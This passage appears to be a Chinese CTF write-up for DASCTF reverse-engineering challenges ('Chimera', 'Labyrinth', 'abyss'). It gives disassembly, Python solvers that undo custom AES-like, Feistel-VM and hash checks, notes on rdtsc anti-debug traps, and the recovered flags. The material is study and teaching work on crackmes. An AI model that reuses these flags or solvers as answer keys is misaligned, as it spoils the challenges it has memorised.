    # stage3 checks input[24:38] by a 14x14 matrix multiplication modulo 256.
    target = list(data[va_to_off(TARGET_VA):va_to_off(TARGET_VA) + 14])
    mat_raw = data[va_to_off(MATRIX_VA):va_to_off(MATRIX_VA) + 14 * 14]
    matrix = [list(mat_raw[i * 14:(i + 1) * 14]) for i in range(14)]
    part3 = solve_linear_mod_256(matrix, target)

    flag = part1 + part2 + part3
    print(flag.decode())

if __name__ == "__main__":
    main()
```

运行结果：

**DASCTF{pTr4c3_s3Lf_m0d1Fy_c0d3_m4G1c!}**

## Chimera
```
嵌合体的每一部分都来自不同的生物，但它们共同构成了一个完整的怪物。
```

先查看文件类型：

```bash
file chimera
```

结果显示该文件是 64 位 Linux ELF，且符号被去除：

```latex
chimera: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
```

直接运行程序：

```bash
./chimera
```

程序提示输入 flag：

```latex
Enter flag:
```

用 `strings` 查看可见字符串：

```bash
strings -a chimera
```

可以看到：

```latex
DASCTF{
Enter flag:
Wrong!
Correct!
```

因此可以初步判断 flag 前缀为 `DASCTF{`。

#### 主函数逻辑
程序入口处最终跳转到 `0x401eab` 附近的主逻辑。

主逻辑大致如下：

```c
write(1, "Enter flag: ", 12);
len = read(0, buf, 0x28);

if (buf[len - 1] == '\n') {
    len--;
}

if (len != 0x26) {
    puts("Wrong!");
    return 1;
}
```

因此输入长度必须是：

```latex
0x26 = 38
```

flag 整体结构为：

```latex
DASCTF{ + 16字节加密校验部分 + 14字节hash校验部分 + }
```

长度计算：

```latex
7 + 16 + 14 + 1 = 38
```

#### 前缀和后缀校验
在 `0x401faa` 附近可以看到程序把常量 `DASCTF{` 放入栈中，然后逐字节与输入前 7 个字符比较。

比较过程被 MBA 表达式包装了一层，本质仍然是异或比较：

```c
check |= input[i] ^ "DASCTF{"[i];
```

只要最终 `check == 0`，前缀校验通过。

后缀校验在 `0x40202c` 附近：

```plain
cmp al, 0x7d
```

也就是最后一个字符必须是：

```latex
}
```

#### 中间16字节：自定义 AES-like 加密
从 `0x402048` 开始，程序取输入中偏移 `7` 开始的 16 字节：

```c
block = input + 7;
```

然后调用 `0x40179a` 对这 16 字节进行加密，最后与 `.rodata` 中的目标密文比较。

目标密文位于 `0x403140`：

```latex
9c ef 8b e0 e3 a4 d8 da c4 6d c0 43 65 35 b8 3b
```

##### 1.S-box
`.rodata` 中 `0x403020` 开始的 256 字节是自定义 S-box。

程序中的 SubBytes 逻辑本质为：

```c
state[i] = sbox[state[i]];
```

虽然函数中混入了多余的位运算，但最后仍然是直接查表。

##### 2.KeySchedule
密钥位于 `0x403120`：

```latex
5a 3b 7c 1d 8e 4f 6a 2b 9c 0d be 7f 3a 5b 1c ed
```

Rcon 位于 `0x403130`：

```latex
01 02 04 08 10 20 40 80 1b 36
```

密钥扩展逻辑与 AES-128 基本一致，只是 `SubWord` 使用程序自定义的 S-box。

##### 3.加密轮结构
`0x40179a` 中的加密流程被状态机和跳表打散，但还原后就是标准 AES-128 轮结构：

```latex
AddRoundKey(0)

for round in 1..9:
    SubBytes
    ShiftRows
    MixColumns
    AddRoundKey(round)

SubBytes
ShiftRows
AddRoundKey(10)
```

区别在于：

+ S-box 是自定义 S-box
+ KeySchedule 也使用自定义 S-box
+ 其余 MixColumns、ShiftRows、AddRoundKey 结构与 AES 相同

因此直接实现逆过程即可解出这 16 字节。

解密目标密文：

```latex
9cef8be0e3a4d8dac46dc0436535b83b
```

得到：

```latex
cFl4t_mBa_0bfu5c
```

#### 后14字节：DJB2 变体 hash
`0x401e10` 是最后 14 字节的校验函数。

初始值为：

```c
h = 0x1337;
```

每读取一个字符，执行：

```c
h = (h << 5) - h + ch;
```

也就是：

```c
h = h * 31 + ch;
```

然后与 `.rodata` 中 `0x403160` 开始的 14 个 DWORD 比较。

目标 hash 为：

```latex
000253dd 00482837 08bcdedc 0edefd03
cd00a3be d313d435 8f66b2de 5d6fa941
50857f47 c02a69cd 4522d045 5f37389f
87afdb62 6e4b90ff
```

由于每一步都保存了中间 hash，所以可以逐字节反推：

```python
ch = target[i] - previous_hash * 31
```

注意按 32 位无符号整数取模。

反推出后 14 字节为：

```latex
4t3_a3s_h4rD!!
```

#### 拼接 flag
已知：

```latex
prefix = DASCTF{
part1 = cFl4t_mBa_0bfu5c
part2 = 4t3_a3s_h4rD!!
suffix = }
```

拼接得到：

```latex
DASCTF{cFl4t_mBa_0bfu5c4t3_a3s_h4rD!!}
```

##### 验证
```bash
printf 'DASCTF{cFl4t_mBa_0bfu5c4t3_a3s_h4rD!!}\n' | ./chimera
```

输出：

```latex
Enter flag: Correct!
```
#### exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用法：
    python3 exp.py ./chimera
功能：
1. 读取题目给的 chimera ELF 文件
2. 解析 .rodata
3. 自动提取 S-box、key、Rcon、目标密文、hash 表
4. 逆向 AES-like 加密和 hash 校验
5. 输出 flag，并调用原程序验证
"""
from __future__ import annotations

import os
import struct
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path

@dataclass
class Section:
    name: str
    sh_type: int
    sh_flags: int
    sh_addr: int
    sh_offset: int
    sh_size: int

class ELFError(Exception):
    pass

def parse_elf64_sections(blob: bytes) -> list[Section]:
    if blob[:4] != b"\x7fELF":
        raise ELFError("not an ELF file")
    if blob[4] != 2:
        raise ELFError("only ELF64 is supported")
    if blob[5] != 1:
        raise ELFError("only little-endian ELF is supported")

    e_shoff = struct.unpack_from("<Q", blob, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", blob, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", blob, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", blob, 0x3E)[0]

    raw_headers = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        raw_headers.append(struct.unpack_from("<IIQQQQIIQQ", blob, off))

    shstr = raw_headers[e_shstrndx]
    shstr_off, shstr_size = shstr[4], shstr[5]
    shstrtab = blob[shstr_off:shstr_off + shstr_size]

    def cstr(tab: bytes, off: int) -> str:
        end = tab.find(b"\x00", off)
        if end < 0:
            end = len(tab)
        return tab[off:end].decode("utf-8", "replace")

    sections = []
    for h in raw_headers:
        sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = h[:6]
        sections.append(
            Section(
                name=cstr(shstrtab, sh_name),
                sh_type=sh_type,
                sh_flags=sh_flags,
                sh_addr=sh_addr,
                sh_offset=sh_offset,
                sh_size=sh_size,
            )
        )
    return sections

def get_section(blob: bytes, name: str) -> tuple[Section, bytes]:
    for sec in parse_elf64_sections(blob):
        if sec.name == name:
            return sec, blob[sec.sh_offset:sec.sh_offset + sec.sh_size]
    raise ELFError(f"section {name!r} not found")

def find_sbox(rodata: bytes) -> int:
    target = list(range(256))
    candidates = []

    for off in range(0, len(rodata) - 256 + 1):
        block = rodata[off:off + 256]
        if sorted(block) == target:
            candidates.append(off)

    if not candidates:
        raise RuntimeError("S-box table not found")

    aligned = [x for x in candidates if x % 16 == 0]
    return aligned[0] if aligned else candidates[0]

def reverse_hash_bytes(target_hashes: list[int]) -> bytes | None:
    h = 0x1337
    out = bytearray()

    for target in target_hashes:
        ch = (target - ((h * 31) & 0xFFFFFFFF)) & 0xFFFFFFFF
        if ch > 0xFF:
            return None
        out.append(ch)
        h = target

    return bytes(out)

def find_hash_table(rodata: bytes, start: int) -> tuple[int, list[int]]:
    for off in range((start + 3) & ~3, len(rodata) - 14 * 4 + 1, 4):
        vals = list(struct.unpack_from("<14I", rodata, off))
        rev = reverse_hash_bytes(vals)

        if rev is None:
            continue

        if all(0x21 <= b <= 0x7E for b in rev):
            return off, vals

    raise RuntimeError("hash table not found")

def extract_chimera_constants(binary_path: Path):
    blob = binary_path.read_bytes()
    ro_sec, rodata = get_section(blob, ".rodata")

    sbox_off = find_sbox(rodata)
    sbox = rodata[sbox_off:sbox_off + 256]

    key_off = sbox_off + 256
    rcon_off = key_off + 16

    key = rodata[key_off:key_off + 16]
    rcon = rodata[rcon_off:rcon_off + 10]

    ct_off = (rcon_off + 10 + 15) & ~15
    target_ct = rodata[ct_off:ct_off + 16]

    hash_off, target_hashes = find_hash_table(rodata, ct_off + 16)

    prefix = b"DASCTF{"
    if prefix not in blob:
        raise RuntimeError("prefix DASCTF{ not found")

    return {
        "sbox": sbox,
        "key": key,
        "rcon": rcon,
        "target_ct": target_ct,
        "target_hashes": target_hashes,
        "prefix": prefix,
        "suffix": b"}",
        "sbox_va": ro_sec.sh_addr + sbox_off,
        "ct_va": ro_sec.sh_addr + ct_off,
        "hash_va": ro_sec.sh_addr + hash_off,
    }

def expand_key(key: bytes, sbox: bytes, rcon: bytes) -> bytearray:
    round_keys = bytearray(176)
    round_keys[:16] = key

    for i in range(4, 44):
        temp = list(round_keys[(i - 1) * 4:i * 4])

        if i % 4 == 0:
            temp = [
                sbox[temp[1]] ^ rcon[i // 4 - 1],
                sbox[temp[2]],
                sbox[temp[3]],
                sbox[temp[0]],
            ]

        for j in range(4):
            round_keys[i * 4 + j] = round_keys[(i - 4) * 4 + j] ^ temp[j]

    return round_keys

def xtime(x: int) -> int:
    x &= 0xFF
    return ((x << 1) & 0xFF) ^ (0x1B if x & 0x80 else 0)

def gf_mul(x: int, y: int) -> int:
    ret = 0

    while y:
        if y & 1:
            ret ^= x
        x = xtime(x)
        y >>= 1

    return ret & 0xFF

def add_round_key(state: bytearray, round_keys: bytearray, rnd: int) -> None:
    base = rnd * 16
    for i in range(16):
        state[i] ^= round_keys[base + i]

def inv_sub_bytes(state: bytearray, sbox: bytes) -> None:
    inv_sbox = [0] * 256

    for i, v in enumerate(sbox):
        inv_sbox[v] = i

    for i in range(16):
        state[i] = inv_sbox[state[i]]

def inv_shift_rows(state: bytearray) -> None:
    old = state[:]

    for row in range(4):
        for col in range(4):
            state[row + 4 * col] = old[row + 4 * ((col - row) % 4)]

def inv_mix_columns(state: bytearray) -> None:
    for col in range(4):
        a0, a1, a2, a3 = state[4 * col:4 * col + 4]

        state[4 * col + 0] = (
            gf_mul(a0, 14) ^ gf_mul(a1, 11) ^ gf_mul(a2, 13) ^ gf_mul(a3, 9)
        )
        state[4 * col + 1] = (
            gf_mul(a0, 9) ^ gf_mul(a1, 14) ^ gf_mul(a2, 11) ^ gf_mul(a3, 13)
        )
        state[4 * col + 2] = (
            gf_mul(a0, 13) ^ gf_mul(a1, 9) ^ gf_mul(a2, 14) ^ gf_mul(a3, 11)
        )
        state[4 * col + 3] = (
            gf_mul(a0, 11) ^ gf_mul(a1, 13) ^ gf_mul(a2, 9) ^ gf_mul(a3, 14)
        )

def decrypt_custom_aes_block(cipher: bytes, key: bytes, sbox: bytes, rcon: bytes) -> bytes:
    round_keys = expand_key(key, sbox, rcon)
    state = bytearray(cipher)

    add_round_key(state, round_keys, 10)
    inv_shift_rows(state)
    inv_sub_bytes(state, sbox)

    for rnd in range(9, 0, -1):
        add_round_key(state, round_keys, rnd)
        inv_mix_columns(state)
        inv_shift_rows(state)
        inv_sub_bytes(state, sbox)

    add_round_key(state, round_keys, 0)
    return bytes(state)

def recover_hash_part(target_hashes: list[int]) -> bytes:
    rev = reverse_hash_bytes(target_hashes)
    if rev is None:
        raise RuntimeError("hash reverse failed")
    return rev

def solve(binary_path: Path) -> bytes:
    c = extract_chimera_constants(binary_path)

    part1 = decrypt_custom_aes_block(
        c["target_ct"],
        c["key"],
        c["sbox"],
        c["rcon"],
    )

    part2 = recover_hash_part(c["target_hashes"])
    flag = c["prefix"] + part1 + part2 + c["suffix"]

    print(f"[+] binary      : {binary_path}")
    print(f"[+] S-box VA    : 0x{c['sbox_va']:x}")
    print(f"[+] target CT VA: 0x{c['ct_va']:x}")
    print(f"[+] hashes VA   : 0x{c['hash_va']:x}")
    print(f"[+] AES part    : {part1.decode('ascii')}")
    print(f"[+] hash part   : {part2.decode('ascii')}")
    print(f"[+] flag        : {flag.decode('ascii')}")

    return flag

def verify_with_binary(binary_path: Path, flag: bytes) -> None:
    if os.name != "posix":
        return

    old_mode = None

    try:
        st = binary_path.stat()

        if not os.access(binary_path, os.X_OK):
            old_mode = st.st_mode
            binary_path.chmod(st.st_mode | 0o111)

        p = subprocess.run(
            [str(binary_path)],
            input=flag + b"\n",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=3,
            check=False,
        )

        print("[+] program says:")
        print(p.stdout.decode("utf-8", "replace").strip())

    except Exception as e:
        print(f"[!] skip runtime verification: {e}")

    finally:
        if old_mode is not None:
            try:
                binary_path.chmod(old_mode)
            except OSError:
                pass

def main() -> None:
    if len(sys.argv) > 1:
        path = Path(sys.argv[1])
    else:
        path = Path(__file__).with_name("chimera")

    if not path.exists():
        raise SystemExit("usage: python3 exp.py ./chimera")

    flag = solve(path)
    verify_with_binary(path, flag)

if __name__ == "__main__":
    main()
```

运行结果：

```
[+] binary      : d:\ctf\DASCTF2026-sum\reverse\2.Chimera\chimera

[+] S-box VA    : 0x403020

[+] target CT VA: 0x403140

[+] hashes VA   : 0x403160

[+] AES part    : cFl4t_mBa_0bfu5c

[+] hash part   : 4t3_a3s_h4rD!!

[+] flag        : DASCTF{cFl4t_mBa_0bfu5c4t3_a3s_h4rD!!}
```

## Labyrinth
```
在代码的迷宫中，每一条路都可能是死胡同。
```
先用 `strings` 查看可见字符串：

```bash
strings -a labyrinth
```

可以看到关键输出：

```latex
Correct!
Wrong!
Enter flag:
```

用IDA分析入口逻辑，可以看到程序大致流程如下：

```c
write(1, "Enter flag: ", 0xc);
len = read(0, buf, 0x28);

if (buf[len - 1] == '\n') {
    len--;
}

if (len != 0x26) {
    puts("Wrong!");
    exit(1);
}
```

因此 flag 长度必须是：

```latex
0x26 = 38 字节
```

继续向下看，程序没有直接写普通校验逻辑，而是初始化了一张 256 项的 opcode 分发表，然后解释执行 `.rodata` 中的一段字节码

关键地址：

```latex
VM 字节码地址：0x402040
opcode 分发表：0x405080
输入缓冲区：  0x405880
VM 寄存器区： 0x405980
```

主循环形式如下：

```c
pc = 0;
while (pc <= 0x103d) {
    opcode = bytecode[pc];
    dispatch_table[opcode](bytecode, &pc);
}
```

这说明题目核心是一个自定义 VM。题目名 Labyrinth 也对应这里的 VM 迷宫结构，里面存在大量干扰路径和跳转。

#### VM 指令分析
分发表中有一批运算指令，常见 opcode 功能如下：

| opcode | 功能 |
| --- | --- |
| `0x10` | `reg[x] = imm32` |
| `0x11` | `reg[x] = reg[y]` |
| `0x20` | `reg[x] += reg[y]` |
| `0x21` | `reg[x] += imm32` |
| `0x30` | `reg[x] ^= reg[y]` |
| `0x31` | `reg[x] ^= imm32` |
| `0x42` | `reg[x] = rol32(reg[x], imm8)` |
| `0x50` | 从输入缓冲区读取 4 字节到寄存器 |
| `0x61` | 比较寄存器和立即数，不满足则跳转 |

其中最重要的是下面这种重复模式：

```latex
31 02 <key:4 bytes> 42 02 <rot> 21 02 <key:4 bytes>
```

对应的语义是：

```c
reg[2] ^= key;
reg[2] = rol32(reg[2], rot);
reg[2] += key;
```

也就是：

```c
F(x) = rol32(x ^ key, rot) + key;
```

#### 加密结构还原
程序把 38 字节输入复制到 VM 内存中，然后按 8 字节一组处理

38 字节补齐成 40 字节：

```latex
38 字节 flag + 2 字节 \x00\x00
```

所以一共处理 5 组：

```latex
block0: input[0:8]
block1: input[8:16]
block2: input[16:24]
block3: input[24:32]
block4: input[32:40]
```

每组被拆成两个小端 `uint32`：

```c
a = u32(block[0:4]);
b = u32(block[4:8]);
```

每一组执行 16 轮 Feistel-like 变换：

```c
for round in range(16):
    t = b;
    b = a ^ (rol32(b ^ key[round], rot[round]) + key[round]);
    a = t;
```

整理为 Python 写法：

```python
a, b = b, a ^ ((rol32(b ^ key, rot) + key) & 0xffffffff)
```

16 轮的 `(key, rot)` 如下：

```python
ROUNDS = [
    (0x13EA86A0, 31),
    (0xF0701E7A, 4),
    (0xDEFAB371, 15),
    (0x8474EA2A, 2),
    (0x79A1A266, 4),
    (0xDBB04B65, 2),
    (0x927A8054, 31),
    (0x49B7444E, 15),
    (0x74846D06, 14),
    (0x7D424906, 21),
    (0x0CE666C4, 30),
    (0x8A4F279F, 28),
    (0xEA3CE337, 29),
    (0x434D805C, 1),
    (0xD5333C85, 15),
    (0x03FFD197, 30),
]
```

#### 密文提取
VM 最后会把每组加密结果与常量比较。

比较值按小端 `uint32` 表示为：

```python
TARGET = [
    (0xC9922ABB, 0x66F6C692),
    (0x3E878FE9, 0xC227A9EF),
    (0x59631F87, 0x1F28C8A2),
    (0x9C5939BB, 0xC9CD6B7D),
    (0xB0F2534B, 0x26553982),
]
```

这 5 组分别对应 5 个 8 字节明文块。

#### 逆向解密
由于这是 Feistel-like 结构，每一轮都可以直接反推。

正向一轮：

```python
a, b = b, a ^ F(b)
```

假设当前密文状态是 `(a, b)`，反推上一轮：

```python
old_b = a
old_a = b ^ F(a)
a, b = old_a, old_b
```

因此只要倒序遍历 16 轮 key 和 rot，就能还原明文
#### exp
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
exp.py for Labyrinth

用法：
    python3 exp.py ./labyrinth

功能：
    1. 读取题目给的 labyrinth ELF 文件
    2. 自动解析 .rodata
    3. 从 VM 字节码中提取 16 轮 key/rot
    4. 从 VM 字节码中提取 5 组密文比较常量
    5. 逆向 Feistel-like 加密过程，恢复 flag
    6. 可选：调用原程序验证 flag
"""

import os
import re
import sys
import struct
import subprocess
from math import gcd

MASK = 0xFFFFFFFF

def u16(data, off):
    return struct.unpack_from("<H", data, off)[0]

def u32(data, off):
    return struct.unpack_from("<I", data, off)[0]

def u64(data, off):
    return struct.unpack_from("<Q", data, off)[0]

def get_elf_section(data: bytes, sec_name: str) -> bytes:
    """
    纯 Python 解析 ELF64 little-endian section，取出指定 section 内容。
    """
    if data[:4] != b"\x7fELF":
        raise ValueError("not an ELF file")

    elf_class = data[4]
    endian = data[5]

    if elf_class != 2:
        raise ValueError("only ELF64 is supported")
    if endian != 1:
        raise ValueError("only little-endian ELF is supported")

    e_shoff = u64(data, 0x28)
    e_shentsize = u16(data, 0x3A)
    e_shnum = u16(data, 0x3C)
    e_shstrndx = u16(data, 0x3E)

    if e_shoff == 0 or e_shnum == 0:
        raise ValueError("no section header table")

    shstr_hdr = e_shoff + e_shstrndx * e_shentsize
    shstr_off = u64(data, shstr_hdr + 0x18)
    shstr_size = u64(data, shstr_hdr + 0x20)
    shstr = data[shstr_off:shstr_off + shstr_size]

    def read_cstr(buf: bytes, off: int) -> str:
        end = buf.find(b"\x00", off)
        if end == -1:
            end = len(buf)
        return buf[off:end].decode(errors="ignore")

    for i in range(e_shnum):
        sh = e_shoff + i * e_shentsize
        name_off = u32(data, sh + 0x00)
        name = read_cstr(shstr, name_off)

        sh_off = u64(data, sh + 0x18)
        sh_size = u64(data, sh + 0x20)

        if name == sec_name:
            return data[sh_off:sh_off + sh_size]

    raise ValueError(f"section {sec_name!r} not found")

def rol32(x: int, r: int) -> int:
    r &= 31
    return ((x << r) | (x >> (32 - r))) & MASK

def round_func(x: int, key: int, rot: int) -> int:
    return (rol32(x ^ key, rot) + key) & MASK

def decrypt_block(a: int, b: int, rounds) -> bytes:
    """
    正向轮函数：
        new_a = b
        new_b = a ^ (rol32(b ^ key, rot) + key)

    逆向：
        old_b = new_a
        old_a = new_b ^ f(new_a)
    """
    for key, rot in reversed(rounds):
        old_a = b ^ round_func(a, key, rot)
        old_b = a
        a, b = old_a & MASK, old_b & MASK

    return struct.pack("<II", a, b)

def extract_round_pairs(rodata: bytes):
    """
    从 VM 字节码中提取形如：

        11 02 01
        31 02 <key32>
        42 02 <rot8>
        21 02 <same key32>

    的 key/rot 模式。

    其中：
        31 类似 xor imm32
        42 类似 rol imm8
        21 类似 add imm32
    """
    pat = re.compile(
        rb"\x11\x02\x01"
        rb"\x31\x02(.{4})"
        rb"\x42\x02(.)"
        rb"\x21\x02\1",
        re.S
    )

    pairs = []
    for m in pat.finditer(rodata):
        key = struct.unpack("<I", m.group(1))[0]
        rot = m.group(2)[0]
        pairs.append((key, rot))

    if not pairs:
        raise ValueError("failed to extract round key/rot pairs")

    return pairs

def extract_targets(rodata: bytes):
    """
    从 VM 字节码中提取比较常量。

    目标密文出现形式大致为：

        61 00 <uint32> 3c 10
        ...
        61 01 <uint32> 3c 10

    对应每个 8 字节块加密后的两个 uint32。
    """
    pat = re.compile(
        rb"\x61\x00(.{4})\x3c\x10"
        rb".{0,80}?"
        rb"\x61\x01(.{4})\x3c\x10",
        re.S
    )

    targets = []
    for m in pat.finditer(rodata):
        a = struct.unpack("<I", m.group(1))[0]
        b = struct.unpack("<I", m.group(2))[0]
        targets.append((a, b))

    if not targets:
        raise ValueError("failed to extract encrypted target blocks")

    return targets

def infer_rounds(all_pairs, block_count):
    """
    当前题目 5 个 block，每个 block 都重复同一套 16 轮 key/rot。
    这里不硬编码 16，而是根据提取到的总 pair 数和 block 数自动推断。
    """
    if block_count <= 0:
        raise ValueError("invalid block count")

    if len(all_pairs) % block_count == 0:
        n = len(all_pairs) // block_count
        candidate = all_pairs[:n]

        ok = True
        for i in range(block_count):
            if all_pairs[i * n:(i + 1) * n] != candidate:
                ok = False
                break

        if ok:
            return candidate

    # 兜底：寻找最小重复周期
    for n in range(1, len(all_pairs) + 1):
        if len(all_pairs) % n != 0:
            continue
        candidate = all_pairs[:n]
        if all_pairs == candidate * (len(all_pairs) // n):
            return candidate

    raise ValueError("failed to infer round count")

def solve(binary_path: str) -> str:
    data = open(binary_path, "rb").read()

    rodata = get_elf_section(data, ".rodata")

    targets = extract_targets(rodata)
    all_pairs = extract_round_pairs(rodata)
    rounds = infer_rounds(all_pairs, len(targets))

    plain = b"".join(decrypt_block(a, b, rounds) for a, b in targets)
    plain = plain.rstrip(b"\x00")

    try:
        flag = plain.decode()
    except UnicodeDecodeError:
        flag = plain.decode(errors="replace")

    print(f"[*] binary      : {binary_path}")
    print(f"[*] .rodata     : {len(rodata)} bytes")
    print(f"[*] blocks      : {len(targets)}")
    print(f"[*] rounds      : {len(rounds)}")
    print("[*] targets     :")
    for i, (a, b) in enumerate(targets):
        print(f"    block {i}: {a:08x} {b:08x}")

    print("[+] flag        :", flag)
    return flag

def verify(binary_path: str, flag: str):
    """
    调用原始 labyrinth 程序验证。
    """
    if not os.access(binary_path, os.X_OK):
        try:
            os.chmod(binary_path, 0o755)
        except Exception:
            pass

    try:
        p = subprocess.run(
            [binary_path],
            input=(flag + "\n").encode(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )

        out = p.stdout.decode(errors="ignore")
        err = p.stderr.decode(errors="ignore")

        print("[*] verify output:")
        if out:
            print(out, end="" if out.endswith("\n") else "\n")
        if err:
            print(err, end="" if err.endswith("\n") else "\n")

    except Exception as e:
        print(f"[!] verify failed: {e}")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} ./labyrinth")
        sys.exit(1)

    binary_path = sys.argv[1]
    flag = solve(binary_path)
    verify(binary_path, flag)

if __name__ == "__main__":
    main()
```

运行结果：

```
[*] binary      : ./labyrinth

[*] .rodata     : 4222 bytes

[*] blocks      : 5

[*] rounds      : 16

[*] targets     :

block 0: c9922abb 66f6c692

block 1: 3e878fe9 c227a9ef

block 2: 59631f87 1f28c8a2

block 3: 9c5939bb c9cd6b7d

block 4: b0f2534b 26553982

[+] flag        : DASCTF{vM_d1sp4tch_f31st3L_n3t_w0rk!!}
```
## abyss
```
深渊凝视着你，而你看到的一切都是幻象。
```
先查看文件类型：

```bash
$ file abyss
abyss: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

这是一个 64 位 Linux 静态链接 ELF，并且已经去符号。直接运行程序：

```bash
$ ./abyss
Enter flag:
```

程序读取输入后只输出 `Correct!` 或 `Wrong!`。由于是 stripped + static binary，不能只依赖函数名，需要从入口附近向下分析主逻辑。

#### 输入格式检查
在 `0x401620` 附近可以看到主校验逻辑。程序先输出 `Enter flag:`，然后读取最多 `0x29` 字节输入：

```plain
401624  push   r15
401626  mov    edx,0xc
40162b  mov    esi,0x4ccb80      ; "Enter flag: "
401630  mov    edi,0x1
401644  call   write
401649  xor    edi,edi
40164b  mov    edx,0x29
401650  lea    rsi,[rsp+0x10]
401655  call   read
```

随后会去掉末尾换行并检查长度：

```plain
40166c  cmp    rax,0x28
401670  jne    wrong
```

也就是输入长度必须为 `0x28 = 40` 字节。

接着检查固定格式：

```plain
401672  cmp    dword ptr [rsp+0x10],0x43534144  ; "DASC"
4016ab  cmp    word  ptr [rsp+0x14],0x4654      ; "TF"
4016b4  cmp    byte  ptr [rsp+0x16],0x7b        ; "{"
4016bb  cmp    byte  ptr [rsp+0x37],0x7d        ; "}"
```

所以 flag 结构为：

```latex
DASCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

其中花括号内部正好是 32 字节。

#### 共享内存和双进程结构
格式检查通过后，程序调用 `mmap` 申请一段大小为 `0x33c20` 的内存：

```plain
4016c2  xor    r9d,r9d
4016c5  or     r8d,0xffffffff
4016c9  mov    ecx,0x21          ; MAP_SHARED | MAP_ANONYMOUS
4016d0  mov    edx,0x3           ; PROT_READ | PROT_WRITE
4016d5  mov    esi,0x33c20
4016da  call   mmap
```

这里的 `0x21` 很关键，表示：

```c
MAP_SHARED | MAP_ANONYMOUS
```

所以后续 `fork` 之后，父进程和子进程会共享这段内存。程序接着调用 `fork`：

```plain
4016fb  call   fork
401700  mov    ebx,eax
401702  test   eax,eax
401704  js     error
40170a  je     child_process
```

整体结构可以理解为：

```c
pid = fork();
if (pid == 0) {
    run_vm(shared_mem);
} else {
    parent_controller(pid, shared_mem);
}
```

子进程运行 VM，父进程通过 `ptrace` 控制子进程继续执行。VM 中会主动触发 `int3`，父进程收到断点后再继续调度。

#### VM 数据布局
父进程会把两段数据复制到共享内存中：

```plain
4017f4  lea    rdi,[rbp+0x100]
4017fe  mov    edx,0x2f000
401803  mov    esi,0x499330
401812  call   memcpy

401817  mov    edx,0x4820
40181c  mov    esi,0x4c8330
401821  mov    rdi,r14           ; rbp + 0x2f200
401824  call   memcpy
```

共享内存结构如下：

```latex
rbp + 0x00000    当前输入块，16 字节
rbp + 0x00010    VM 输出块，16 字节
rbp + 0x00100    VM 数据区 / 白盒表，大小 0x2f000
rbp + 0x2f100    VM 字节码解密 key
rbp + 0x2f200    加密 VM 字节码，大小 0x4820
```

花括号内 32 字节会被分成两个 16 字节块分别处理：

```plain
401829  movdqu xmm0,[rsp+0x17]   ; body[0:16]
401843  movups [rbp+0x0],xmm0
...
40188a  movdqu xmm2,[rsp+0x27]   ; body[16:32]
401897  movups [rbp+0x0],xmm2
```

每个 16 字节块都会进入同一套 VM，VM 运行结束后从 `rbp + 0x10` 取 16 字节输出。

两轮输出拼接为 32 字节，然后与程序中的目标表比较：

```plain
4018ef  movdqu xmm3,[rbp+0x10]
4018f4  mov    edx,0x20
4018f9  mov    esi,0x4ccb60      ; target
4018fe  lea    rdi,[rsp+0x40]    ; output[32]
401908  call   memcmp
```

目标表数据为：

```python
target = bytes.fromhex(
    "2d5ca3a57522ace9e55fc8138fa2ebc9"
    "4e46adc2521beebe77c7058ee7048ae0"
)
```

#### 反调试/反慢速执行
程序里存在 `rdtsc` 计时逻辑。如果 VM 执行过程被调试器拖慢，父进程会修改 VM 字节码，导致后续校验失败。

第一处：

```plain
4019cf  rdtsc
4019e8  cmp    rax,0x4c4b40
4019ee  jbe    ok
4019f0  not    byte ptr [rbp+0x2f22a]
4019f6  xor    byte ptr [rbp+0x2f22b],0xa5
```

第二处：

```plain
401a2c  rdtsc
401a45  cmp    rax,0x4c4b40
401a4b  jbe    ok
401a4d  not    byte ptr [rbp+0x2f22a]
401a53  xor    byte ptr [rbp+0x2f22b],0xa5
```

也就是说，直接在调试器里单步很容易触发这两处破坏逻辑。分析时需要注意这不是普通比较失败，而是 VM 字节码被故意改坏。

VM 字节码解密 key 位于：

```latex
rbp + 0x2f100
```

写入位置：

```plain
401833  mov    byte ptr [rbp+0x2f100],r12b
401890  mov    byte ptr [rbp+0x2f100],r12b
```

程序会先计算 CRC，再和 `0x4fa0f0` 处的字节异或，得到 VM 初始 key。实际分析得到 key 为：

```latex
0xa5
```

---

#### VM 指令解密和分发
子进程 VM 入口在 `0x401bb0`。核心循环每次从 `rbp + 0x2f200` 取 8 字节加密指令，然后用 key 解密：

```plain
401c05  movzx  eax,byte ptr [rbx+0x2f100]
401c1f  mov    byte ptr [rsp+0x168],al
...
401c40  movzx  edx,byte ptr [rdi+rax]
401c44  xor    edx,ecx
401c46  mov    byte ptr [rsp+rax+8],dl
```

解密出 8 字节指令后，会计算一个滚动校验值：

```plain
401c60  mov    esi,edx
401c62  movzx  ecx,byte ptr [rax]
401c69  rol    sil,0x3
401c6f  xor    edx,ecx
```

校验通过后更新 key，并根据 opcode 跳到指令处理函数：

```plain
401c76  cmp    sil,cl
401c7e  cmove  edx,r9d
401c89  mov    qword ptr [rdi],rax
401c8c  mov    byte ptr [rsp+0x168],dl
401cb8  jmp    qword ptr [rax*8+0x499020]
```

跳表在 `0x499020`，从各个 case 可以识别出 VM 指令大致包括：

```latex
mov reg, imm
mov reg, reg
add / sub / xor / and / or
shl / shr
load byte / store byte
load dword / store dword
cmp / set flag
jcc / call / ret
int3
exit
```

VM 内部主体是白盒 AES 风格结构：输入 16 字节，查表、轮变换，最后输出 16 字节。程序对两个 16 字节输入块重复执行这套 VM。

#### 还原明文
已知：

```latex
output = VM(flag_body_block)
memcmp(output, target, 0x20)
```

因此需要逆向 VM 内部的白盒表，恢复使输出等于目标表的输入。对两块 16 字节分别还原，可以得到 32 字节 body：

```latex
wH1t3_b0x_A3S_dUaL_pR0c_VM_0d4Y!
```

